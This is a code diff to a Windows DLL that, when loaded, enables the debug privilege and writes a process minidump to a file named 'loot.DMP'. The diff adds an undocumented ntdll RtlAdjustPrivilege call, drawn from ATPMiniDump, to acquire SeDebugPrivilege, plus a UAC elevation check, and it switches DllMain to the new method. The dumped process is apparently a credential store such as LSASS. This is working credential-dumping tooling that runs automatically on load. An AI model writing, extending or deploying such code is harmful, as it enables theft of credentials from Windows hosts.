@@ -1,8 +1,13 @@
-#include "pch.h"
 #include <iostream>
 #include <Windows.h>
 #include <DbgHelp.h>
 #include <TlHelp32.h>
+#include "pch.h"
+
+#define SE_DEBUG_PRIVILEGE 20
+
+// boolean ref: https://devblogs.microsoft.com/oldnewthing/20041222-00/?p=36923
+EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 
 const LPCWSTR dmpPath = L"loot.DMP";
 
@@ -40,6 +45,7 @@ BOOL miniDumpLoot() {
 }
 
 // ref: https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
+// win32 method of enabling access token privileges
 BOOL setPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
 {
     LUID luid;
@@ -81,14 +87,42 @@ BOOL setSEDebug() {
 	return bRet;
 }
 
+// Runtime libraries enable privileges, native api method of changing privileges (undocumented ntdll function)
+// returns previous debug privilege state
+BOOLEAN setRtlSEDebug() {
+	BOOLEAN bPreviousPrivilegeStatus = FALSE; 
+    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bPreviousPrivilegeStatus);
+	return bPreviousPrivilegeStatus;
+}
+
+
+// ref: https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L80
+// check if process is UAC elevated (does not check if System integrity or runas administrator)
+BOOL IsElevated() {
+	BOOL fRet = FALSE;
+	HANDLE hToken = NULL;
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+		TOKEN_ELEVATION Elevation = { 0 };
+		DWORD cbSize = sizeof(TOKEN_ELEVATION);
+		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
+			fRet = Elevation.TokenIsElevated;
+		}
+	}
+	if (hToken) {
+		CloseHandle(hToken);
+	}
+	return fRet;
+}
+
+
 BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-		setSEDebug();
+		setRtlSEDebug();
 		miniDumpLoot();
     case DLL_THREAD_ATTACH:
-		setSEDebug();
+		setRtlSEDebug();
 		miniDumpLoot();
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
